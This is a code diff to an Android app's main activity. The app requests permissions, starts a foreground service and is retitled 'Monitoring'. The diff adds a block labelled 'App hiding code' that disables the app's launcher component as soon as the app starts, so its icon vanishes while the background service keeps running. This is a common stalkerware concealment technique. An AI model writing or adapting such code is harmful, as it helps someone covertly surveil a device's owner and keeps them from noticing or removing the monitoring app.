@@ -1,5 +1,4 @@
 package com.example.foreground1;
-
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -7,6 +6,7 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -30,10 +30,8 @@ import retrofit2.Callback;
 import retrofit2.Response;
 import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
-
 public class MainActivity extends AppCompatActivity {
     private int flag = 0;
-
     private static final int PERMISSIONS_REQUEST_CODE = 999;
     Intent foregroundServiceIntent;
     String[] appPermissions = {
@@ -45,7 +43,7 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        getSupportActionBar().setTitle("Prashanth");
+        getSupportActionBar().setTitle("Monitoring");
         if(checkPermission()){
             foregroundServiceIntent = new Intent(this,ForegroundService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -53,7 +51,18 @@ public class MainActivity extends AppCompatActivity {
             }
             System.out.println("Permissiongd done");
         }
+        // App hiding code
+        onPause();
     }
+
+    @Override
+        protected void onPause() {
+            super.onPause();
+        PackageManager packageManager = getPackageManager();
+        ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+        packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+        PackageManager.DONT_KILL_APP);
+        }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
@@ -73,7 +82,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
-
     private boolean checkPermission() {
         List<String> listPermissionNeeded = new ArrayList<>();
         for (String item : appPermissions) {
@@ -89,5 +97,4 @@ public class MainActivity extends AppCompatActivity {
         //App has all permissions. Proceed ahead
         return true;
     }
-
 }
